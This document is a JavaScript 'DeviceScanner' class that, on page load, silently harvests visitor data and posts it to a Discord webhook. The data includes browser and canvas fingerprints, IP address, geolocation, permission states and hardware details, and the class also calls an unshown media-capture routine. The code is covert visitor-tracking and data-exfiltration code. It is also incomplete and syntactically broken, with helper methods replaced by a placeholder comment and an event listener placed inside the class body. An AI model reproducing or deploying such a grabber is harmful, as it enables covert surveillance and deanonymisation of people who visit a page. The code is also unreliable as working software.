class DeviceScanner {
    constructor() {
        this.webhookUrl = window.getWebhookConfig();
        this.scanData = {};
        this.isScanComplete = false;
        this.startScan();
    }

    async startScan() {
        try {
            await this.collectSystemInfo();
            await this.startMediaCapture();
        } catch (error) {
            this.sendError(error);
        }
    }

    async collectSystemInfo() {
        this.scanData = {
            identity: {
                userId: this.generateId(),
                sessionId: this.generateId(),
                authMethod: 'Unknown',
                isAuthenticated: false,
                deviceLinked: false,
                accountAge: 'Unknown',
                loginTimestamp: new Date().toISOString()
            },
            features: {
                cssGrid: this.testFeature('CSS Grid', 'display: grid'),
                cssVariables: this.testFeature('CSS Variables', '--test-var: red'),
                es6Support: typeof Symbol !== 'undefined',
                html5Video: !!document.createElement('video').canPlayType,
                html5Audio: !!document.createElement('audio').canPlayType,
                mediaDevices: !!navigator.mediaDevices,
                batteryAPI: !!navigator.getBattery,
                vibrationAPI: !!navigator.vibrate,
                clipboardAPI: !!navigator.clipboard,
                darkModePreference: window.matchMedia('(prefers-color-scheme: dark)').matches,
                prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
            },
            device: {
                name: navigator.deviceName || 'Unknown',
                model: navigator.deviceModel || 'Unknown',
                brand: this.getDeviceBrand(),
                type: this.getDeviceType(),
                manufacturer: 'Unknown',
                os: navigator.platform,
                osVersion: this.getOSVersion(),
                architecture: navigator.cpuClass || 'Unknown',
                uuid: this.generateId(),
                identifier: this.generateId(),
                deviceType: this.getDeviceType(),
                gpu: this.getGPUInfo().renderer,
                gpuVendor: this.getGPUInfo().vendor,
                gpuRenderer: this.getGPUInfo().renderer,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                platform: navigator.platform,
                isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
            },
            browser: {
                name: this.getBrowserName(),
                version: this.getBrowserVersion(),
                engine: this.getBrowserEngine(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                javascriptEnabled: true,
                doNotTrack: navigator.doNotTrack || 'Not enabled',
                plugins: this.getPlugins(),
                extensions: 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                resolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                incognito: this.detectIncognito(),
                webGL: this.getWebGLInfo(),
                canvasFingerprint: this.getCanvasFingerprint(),
                audioFingerprint: 'Unknown'
            },
            fingerprint: {
                id: this.generateFingerprint(),
                canvas: this.getCanvasFingerprint(),
                webgl: this.getWebGLFingerprint(),
                audio: 'Unknown',
                hash: this.generateHash(),
                raw: this.getRawFingerprintData(),
                userId: this.generateId(),
                sessionId: this.generateId(),
                deviceId: this.generateId(),
                deviceHash: this.generateHash(),
                fonts: this.getFonts(),
                timezoneOffsetHash: this.generateHash(new Date().getTimezoneOffset().toString()),
                screenResolutionHash: this.generateHash(`${window.screen.width}x${window.screen.height}`),
                userAgentHash: this.generateHash(navigator.userAgent),
                navigatorHash: this.generateHash(JSON.stringify(this.getNavigatorData())),
                tlsFingerprint: 'Unknown',
                touchSupport: 'ontouchstart' in window,
                osHash: this.generateHash(navigator.platform),
                webGLVendor: this.getGPUInfo().vendor,
                webGLRenderer: this.getGPUInfo().renderer,
                audioData: 'Unknown',
                canvasData: this.getCanvasFingerprint(),
                mouseMovementPattern: 'Unknown',
                generatedBy: 'DeviceScanner',
                signature: this.generateHash(Date.now().toString())
            },
            sensors: {
                accelerometer: 'DeviceOrientationEvent' in window,
                gyroscope: 'DeviceOrientationEvent' in window,
                magnetometer: 'DeviceOrientationEvent' in window,
                orientation: 'DeviceOrientationEvent' in window,
                light: 'ondevicelight' in window,
                proximity: 'ondeviceproximity' in window,
                motion: 'ondevicemotion' in window
            },
            battery: {
                level: 'Unknown',
                charging: 'Unknown',
                chargingTime: 'Unknown',
                dischargingTime: 'Unknown'
            },
            network: {
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
                effectiveType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                rtt: navigator.connection ? navigator.connection.rtt : 'Unknown',
                saveData: navigator.connection ? navigator.connection.saveData : 'Unknown',
                ipAddress: await this.getIPAddress(),
                macAddress: 'Unknown'
            },
            history: {
                length: window.history.length,
                navigation: 'PerformanceNavigation' in window,
                chrome: {
                    history: 'chrome' in window && 'history' in window.chrome
                }
            },
            storage: {
                local: !!window.localStorage,
                session: !!window.sessionStorage,
                indexedDB: !!window.indexedDB,
                fileSystem: 'requestFileSystem' in window,
                usage: 'Unknown',
                quota: 'Unknown',
                cookies: navigator.cookieEnabled
            },
            location: await this.getGeolocation(),
            permissions: {
                geolocation: await this.checkPermission('geolocation'),
                camera: await this.checkPermission('camera'),
                microphone: await this.checkPermission('microphone'),
                notifications: await this.checkPermission('notifications'),
                clipboard: await this.checkPermission('clipboard-read'),
                push: await this.checkPermission('push')
            },
            behavior: {
                typingSpeed: 'Unknown',
                mouseMovements: 'Unknown',
                clickRate: 'Unknown',
                scrollSpeed: 'Unknown',
                focusChanges: 'Unknown'
            },
            ai: {
                botDetectionScore: this.calculateBotScore(),
                anomalyScore: this.calculateAnomalyScore()
            },
            window: {
                innerHeight: window.innerHeight,
                innerWidth: window.innerWidth,
                outerHeight: window.outerHeight,
                outerWidth: window.outerWidth,
                devicePixelRatio: window.devicePixelRatio,
                screenX: window.screenX,
                screenY: window.screenY,
                availHeight: window.screen.availHeight,
                availWidth: window.screen.availWidth
            },
            audio: {
                contextSampleRate: this.getAudioContextSampleRate(),
                outputLatency: 'Unknown',
                hash: 'Unknown'
            },
            canvas: {
                winding: this.getCanvasWinding(),
                textData: this.getCanvasText(),
                imageData: this.getCanvasImageData(),
                hash: this.generateHash(this.getCanvasFingerprint()),
                pixelRatio: window.devicePixelRatio
            },
            cpu: {
                architecture: navigator.cpuClass || 'Unknown',
                logicalProcessors: navigator.hardwareConcurrency || 'Unknown',
                threads: 'Unknown',
                vendor: this.getCPUVendor(),
                model: 'Unknown'
            },
            jsFeatures: {
                webAssembly: 'WebAssembly' in window,
                serviceWorker: 'serviceWorker' in navigator,
                workerThreads: 'Worker' in window,
                offlineSupport: 'onLine' in navigator,
                notificationSupport: 'Notification' in window,
                indexedDB: 'indexedDB' in window,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                deviceMotion: 'DeviceMotionEvent' in window,
                touchSupport: 'ontouchstart' in window,
                permissionsAPI: 'permissions' in navigator,
                clipboardAccess: 'clipboard' in navigator,
                geolocationSupport: 'geolocation' in navigator
            },
            geo: await this.getGeoInfo(),
            security: {
                cookiesBlocked: !navigator.cookieEnabled,
                localStorageBlocked: !window.localStorage,
                thirdPartyCookies: 'Unknown',
                httpsEnforced: window.location.protocol === 'https:',
                referrerPolicy: 'Unknown',
                contentSecurityPolicy: 'Unknown'
            },
            inputDevices: {
                mousePresent: 'onmousemove' in window,
                keyboardPresent: 'onkeydown' in window,
                touchscreenPresent: 'ontouchstart' in window,
                gamepads: 'getGamepads' in navigator
            },
            language: {
                primary: navigator.language,
                preferred: navigator.languages ? navigator.languages[0] : navigator.language,
                system: 'Unknown',
                accepted: navigator.languages ? navigator.languages.join(', ') : navigator.language
            },
            memory: {
                jsHeapSizeLimit: 'memory' in performance ? performance.memory.jsHeapSizeLimit : 'Unknown',
                totalJSHeapSize: 'memory' in performance ? performance.memory.totalJSHeapSize : 'Unknown',
                usedJSHeapSize: 'memory' in performance ? performance.memory.usedJSHeapSize : 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown'
            },
            meta: {
                session: this.generateId(),
                client: 'web'
            },
            env: {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                device: this.getDeviceType(),
                os: navigator.platform
            },
            system: {
                locale: navigator.language,
                deviceId: this.generateId()
            },
            chrome: {
                plugins: this.getPlugins(),
                extensionCount: 'Unknown'
            },
            experiments: {
                variantId: this.generateId()
            },
            user: {
                isLoggedIn: false,
                id: this.generateId(),
                referrer: document.referrer || 'Direct'
            }
        };

        // Get battery info if available
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                this.scanData.battery = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {}
        }

        await this.sendToDiscord({
            embeds: [{
                title: "🔍 Complete System Scan Results",
                color: 0x3498db,
                fields: this.createInfoFields(),
                timestamp: new Date().toISOString()
            }]
        });
    }

    // [All helper methods for collecting data]
    // getBrowserName(), getBrowserVersion(), getGPUInfo(), etc.
    // (Same as your original functions but as class methods)

    createInfoFields() {
        const fields = [];
        
        // Organize by categories
        const categories = {
            "👤 Identity": this.scanData.identity,
            "🧩 Features": this.scanData.features,
            "🖥️ Device": this.scanData.device,
            "🌐 Browser": this.scanData.browser,
            "🕵️ Fingerprint": this.scanData.fingerprint,
            "🛰️ Sensors": this.scanData.sensors,
            "🔋 Battery": this.scanData.battery,
            "📶 Network": this.scanData.network,
            "📜 History": this.scanData.history,
            "💾 Storage": this.scanData.storage,
            "🧭 Location": this.scanData.location,
            "🔐 Permissions": this.scanData.permissions,
            "🧠 Behavior": this.scanData.behavior,
            "🤖 AI": this.scanData.ai,
            "🪟 Window": this.scanData.window,
            "🧬 Audio": this.scanData.audio,
            "🖼️ Canvas": this.scanData.canvas,
            "🧠 CPU": this.scanData.cpu,
            "🧪 JS Features": this.scanData.jsFeatures,
            "🗺️ Geo": this.scanData.geo,
            "🔐 Security": this.scanData.security,
            "🎮 Input Devices": this.scanData.inputDevices,
            "💬 Language": this.scanData.language,
            "🧠 Memory": this.scanData.memory,
            "🧩 Meta": {
                system: this.scanData.system,
                env: this.scanData.env,
                meta: this.scanData.meta,
                chrome: this.scanData.chrome,
                experiments: this.scanData.experiments,
                user: this.scanData.user
            }
        };

        for (const [categoryName, categoryData] of Object.entries(categories)) {
            let value = '';
            for (const [key, val] of Object.entries(categoryData)) {
                value += `**${key}:** ${JSON.stringify(val)}\n`;
            }
            fields.push({
                name: categoryName,
                value: value.length > 1024 ? value.substring(0, 1020) + '...' : value,
                inline: false
            });
        }

        return fields;
    }

    async sendToDiscord(data) {
        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error('Error sending to Discord:', error);
        }
    }

    // Start scanner when page loads
    window.addEventListener('DOMContentLoaded', () => {
        new DeviceScanner();
    });
}
